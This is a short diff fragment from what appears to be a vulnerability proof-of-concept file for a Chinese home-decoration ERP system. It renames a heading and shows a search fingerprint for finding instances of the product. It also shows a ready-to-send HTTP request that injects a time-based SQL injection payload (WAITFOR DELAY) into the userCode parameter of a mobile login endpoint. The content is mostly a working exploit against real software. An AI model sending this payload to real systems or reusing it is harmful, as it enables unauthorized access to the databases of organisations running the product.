@@ -10,7 +10,7 @@
 app="装盟科技-家装ERP管理系统"
 ```
 
-## poc
+## POC
 
 ```java
 GET /WEB_SERVICE/WeChatAPI_ERPMobile.ashx?type=LoginIndex&userCode=1';WAITFOR+DELAY+'0:0:5'-- -&password=1 HTTP/1.1
